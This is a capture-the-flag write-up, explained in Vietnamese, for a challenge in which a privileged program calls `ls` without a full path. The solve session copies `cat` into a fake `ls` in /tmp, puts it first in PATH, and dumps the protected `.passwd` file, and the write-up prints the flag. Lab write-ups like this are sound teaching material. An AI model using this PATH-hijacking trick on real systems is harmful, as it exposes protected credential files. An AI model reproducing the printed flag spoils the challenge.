# Source

[Source](./ch11.c)

# Solve

```bash
app-script-ch11@challenge02:~$ ls
ch11  ch11.c  Makefile
app-script-ch11@challenge02:~$ clear
app-script-ch11@challenge02:~$ ./ch11
/challenge/app-script/ch11/.passwd
app-script-ch11@challenge02:~$ echo "$path"

app-script-ch11@challenge02:~$ echo "$PATH"
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
app-script-ch11@challenge02:~$ which cat
/bin/cat
app-script-ch11@challenge02:~$ mkdir /tmp/cat-fake
app-script-ch11@challenge02:~$ cp /bin/cat /tmp/cat-fake/ls
app-script-ch11@challenge02:~$ ls /tmp/cat-fake
ls
app-script-ch11@challenge02:~$ export PATH="/tmp/cat-fake/:$PATH"
app-script-ch11@challenge02:~$ ./ch11
!oPe96a/.s8d5
app-script-ch11@challenge02:~$
```
- Cách khai thác ở đây là do trong mã nguồn sử dụng lệnh `ls`. 
- Để thực thi được lệnh `ls` thì chương trình phải tìm đường dẫn của lệnh này ở trong biến môi trường có tên $PATH.
- Xem nội dung của biến này bằng lệnh: `echo $PATH`
- Tiếp theo, sao chép lại lệnh `cat`, đổi tên thành `ls` và đưa vào một nơi khác. Export đường dẫn của lệnh `ls` này vào biến `$PATH` bằng câu lệnh: `export PATH="<đường dẫ>:$PATH"`
- Chạy lại chương trình thì thay thì thực thi lệnh `ls` thì chương trình sẽ dùng lệnh `cat` và in ra nội dung của file .passwd.

### 🚩Flag: `!oPe96a/.s8d5`